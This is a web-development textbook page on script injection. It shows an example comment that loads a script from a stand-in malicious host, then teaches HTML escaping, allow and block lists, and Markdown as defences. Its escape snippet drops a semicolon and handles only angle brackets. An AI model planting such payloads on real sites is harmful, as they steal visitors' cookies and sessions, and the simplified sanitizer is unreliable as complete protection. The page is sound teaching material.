<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=print><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.148.1"><meta name=generator content="Relearn 8.0.0"><meta name=description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form> The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script> If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.js will run on our page! That means it can potentially access our site’s cookies, and make AJAX requests from our site. This script will run on the page for all visitors!'><meta name=author content="Nathan Bean & Russell Feldhausen"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://textbooks.cs.ksu.edu/cis526/images/hero.png"><meta name=twitter:title content="Script Injection :: CIS 526 Textbook"><meta name=twitter:description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form> The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script> If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.js will run on our page! That means it can potentially access our site’s cookies, and make AJAX requests from our site. This script will run on the page for all visitors!'><meta property="og:url" content="https://textbooks.cs.ksu.edu/cis526/06-dynamic-web-servers/11-script-injection/index.html"><meta property="og:site_name" content="CIS 526 Textbook"><meta property="og:title" content="Script Injection :: CIS 526 Textbook"><meta property="og:description" content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form> The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script> If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.js will run on our page! That means it can potentially access our site’s cookies, and make AJAX requests from our site. This script will run on the page for all visitors!'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="Dynamic Web Servers"><meta property="article:published_time" content="2018-08-24T10:53:26-05:00"><meta property="article:modified_time" content="2021-07-01T14:13:35-05:00"><meta property="og:image" content="https://textbooks.cs.ksu.edu/cis526/images/hero.png"><meta itemprop=name content="Script Injection :: CIS 526 Textbook"><meta itemprop=description content='Whenever we render content created by users, we open the door to script injection, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:
<form action="post"> <label for="comment"> <textarea name="comment"></textarea> </label> <input type="submit"/> </form> The intent is to allow the user to post comments on the page. But a malicious user could enter something like:
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script> If we concatenate this string directly into the webpage, we will serve the <script> tag the user included, which means that dangerous-script.js will run on our page! That means it can potentially access our site’s cookies, and make AJAX requests from our site. This script will run on the page for all visitors!'><meta itemprop=datePublished content="2018-08-24T10:53:26-05:00"><meta itemprop=dateModified content="2021-07-01T14:13:35-05:00"><meta itemprop=wordCount content="662"><meta itemprop=image content="https://textbooks.cs.ksu.edu/cis526/images/hero.png"><title>Script Injection :: CIS 526 Textbook</title><link href=https://textbooks.cs.ksu.edu/cis526/06-dynamic-web-servers/11-script-injection/index.html rel=canonical type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/index.xml rel=alternate type=application/rss+xml title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/tele.html rel=alternate type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/06-dynamic-web-servers/11-script-injection/embed.html rel=alternate type=text/html title="Script Injection :: CIS 526 Textbook"><link href=/cis526/css/auto-complete/auto-complete.min.css?1769117712 rel=stylesheet><script src=/cis526/js/auto-complete/auto-complete.min.js?1769117712 defer></script><script src=/cis526/js/search-lunr.min.js?1769117712 defer></script><script src=/cis526/js/search.min.js?1769117712 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="/cis526/searchindex.en.js?1769117712"</script><script src=/cis526/js/lunr/lunr.min.js?1769117712 defer></script><script src=/cis526/js/lunr/lunr.stemmer.support.min.js?1769117712 defer></script><script src=/cis526/js/lunr/lunr.multi.min.js?1769117712 defer></script><script src=/cis526/js/lunr/lunr.en.min.js?1769117712 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=/cis526/fonts/fontawesome/css/fontawesome-all.min.css?1769117712 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/cis526/fonts/fontawesome/css/fontawesome-all.min.css?1769117712 rel=stylesheet></noscript><link href=/cis526/css/perfect-scrollbar/perfect-scrollbar.min.css?1769117712 rel=stylesheet><link href=/cis526/css/theme.min.css?1769117712 rel=stylesheet><link href=/cis526/css/format-print.min.css?1769117712 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/06-dynamic-web-servers/11-script-injection/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../../..",window.relearn.absBaseUri="https://textbooks.cs.ksu.edu/cis526",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!0,window.relearn.enableBlockCodeWrap=!1,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["light-theme"],window.relearn.customvariantname="my-custom-variant",window.relearn.writeVariant=!1,window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.writeVariant&&window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=/cis526/css/custom.css?1769117712 rel=stylesheet></head><body class="mobile-support embed print" data-url=/cis526/06-dynamic-web-servers/11-script-injection/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><div id=R-main-overlay></div><main id=R-body-inner class="highlightable 06-dynamic-web-servers" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=script-injection>Script Injection</h1><p>Whenever we render content created by users, we open the door to <em>script injection</em>, a kind of attack where a malicious user adds script tags to the content they are posting. Consider this form:</p><div class=highlight dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
</span></span><span style=display:flex><span>   &lt;<span style=color:#f92672>label</span> <span style=color:#a6e22e>for</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;comment&#34;</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>textarea</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;comment&#34;</span>&gt;&lt;/<span style=color:#f92672>textarea</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>label</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>/&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;</span></span></code></pre></div><p>The intent is to allow the user to post comments on the page. But a malicious user could enter something like:</p><div class=highlight dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>What an awesome site &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://malic.ous/dangerous-script.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;</span></span></code></pre></div><p>If we concatenate this string directly into the webpage, we will serve the <code>&lt;script></code> tag the user included, which means that <em>dangerous-script.js</em> will run on our page! That means it can potentially access our site&rsquo;s cookies, and make AJAX requests from our site. This script will run on the page for <em>all</em> visitors!</p><p>This attack is known as <a href=https://www.softwaretestinghelp.com/javascript-injection-tutorial/ rel=external target=_blank>script injection</a>, and is something you <strong>MUST</strong> prevent. So how can we prevent it? There are several strategies:</p><ol><li>HTML Escaping</li><li>Block Lists</li><li>Allow Lists</li><li>Markdown or other Markup Languages</li></ol><h3 id=html-escaping>HTML Escaping</h3><p>The simplest is to &ldquo;escape&rdquo; html tags by replacing the <code>&lt;</code> and <code>></code> characters with their html code equivalents, <code>&amp;lt;</code> (less than symbol) and <code>&amp;gt;</code> (greater than symbol). By replacing the opening and closing brackets with the equivalent HTML code, the browser will render the tags as ordinary strings, instead of as HTML. Thus, the above example will render on the page as:</p><blockquote><p>What an awesome site &lt;script src=&ldquo;<a href="http://malic.ous/dangerous-script.js%22></script" rel=external target=_blank>http://malic.ous/dangerous-script.js">&lt;/script</a>></p></blockquote><p>This can be accomplished in JavaScript with the <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace rel=external target=_blank>String.prototype.replace()</a> method:</p><div class=highlight dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>sanitizedHtmlString</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>htmlString</span>.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/&lt;/g</span>, <span style=color:#e6db74>&#39;&amp;lt;&#39;</span>).<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/&gt;/g</span>, <span style=color:#e6db74>&#39;&amp;gt&#39;</span>);</span></span></code></pre></div><p>The <code>replace()</code> method takes either a regular expression or string to search for - and a string to replace the occurrences with. Here we use regular expressions with the global flag, so that <em>all</em> occurrences will be replaced. We also take advantage of the fact that it returns the modified string to do <a href=https://en.wikipedia.org/wiki/Method_chaining rel=external target=_blank>method chaining</a>, invoking a second <code>replace()</code> call on the string returned from the first call.</p><p>The downside to this approach is that <em>all</em> html in the string is reinterpreted as plain text. This means our comments won&rsquo;t support HTML codes like <code>&lt;b></code> and <code>&lt;i></code>, limiting the ability of users to customize their responses.</p><h3 id=allow-lists>Allow Lists</h3><p>Allow lists (also called &ldquo;whitelists&rdquo;) are a technique to allow only certain tags to be embedded into the page. This approach is more involved, as we must first <em>parse</em> the HTML string the same way a browser would to determine what tags it contains, and then remove any tags that don&rsquo;t appear in our allow list.</p><p>Instead of writing your own code to do this, it is common practice to use a well-maintained and tested open-source library. For example, the NPM package <a href=https://www.npmjs.com/package/sanitize-html rel=external target=_blank>sanitize-html</a> provides this ability.</p><h3 id=block-lists>Block Lists</h3><p>Block lists (also called &ldquo;blacklists&rdquo;) are a similar technique, but rather than specifying a list of <em>allowed</em> tags, you specify a list of <em>disallowed</em> tags. These are then stripped from html strings. This approach is slightly less robust, as new tags are added to the HTML standard will need to be evaluated and potentially added to the block list.</p><h3 id=markdown-or-other-markup-languages>Markdown or other Markup Languages</h3><p>A final option is to have users write their contributions using Markdown or another markup language which is transformed <em>into</em> JavaScript. Markdown (used by GitHub and many other websites) is probably the best-known of these, and provides equivalents to bold, italic, headings, links, and images:</p><div class=highlight dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span># This is transformed into a h1 element 
</span></span><span style=display:flex><span><span style=color:#75715e>## This is transformed into a h2 element
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>&gt; </span><span style=font-style:italic>This is transformed into a blockquote 
</span></span></span><span style=display:flex><span><span style=font-style:italic></span>_this is italicized_ <span style=font-style:italic>*as is this*</span>
</span></span><span style=display:flex><span><span style=font-weight:700>__this is bold__</span> <span style=font-weight:700>**as is this**</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>*</span> this
</span></span><span style=display:flex><span><span style=color:#66d9ef>*</span> is
</span></span><span style=display:flex><span><span style=color:#66d9ef>*</span> an 
</span></span><span style=display:flex><span><span style=color:#66d9ef>*</span> unordered 
</span></span><span style=display:flex><span><span style=color:#66d9ef>*</span> list
</span></span><span style=display:flex><span><span style=color:#66d9ef>1.</span> this
</span></span><span style=display:flex><span><span style=color:#66d9ef>2.</span> is 
</span></span><span style=display:flex><span><span style=color:#66d9ef>3.</span> a 
</span></span><span style=display:flex><span><span style=color:#66d9ef>4.</span> numbered
</span></span><span style=display:flex><span>5. list</span></span></code></pre></div><p>As it does not have conversions for <code>&lt;script></code> and other dangerous tags, HTML generated from it is relatively &ldquo;safe&rdquo; (it is still necessary to escape HTML in the original markup string though).</p><p>As with allow/block lists, Markdown and the like are usually processed with an outside library, like <a href=https://www.npmjs.com/package/markdown rel=external target=_blank>markdown-js</a>. There are similar libraries for most modern programming languages.</p><footer class=footline></footer></article></div></main></div><script src=/cis526/js/clipboard/clipboard.min.js?1769117712 defer></script><script src=/cis526/js/perfect-scrollbar/perfect-scrollbar.min.js?1769117712 defer></script><script src=/cis526/js/theme.min.js?1769117712 defer></script><script src=/cis526/js/embed-iframe.min.js?1769117712 defer></script></body></html>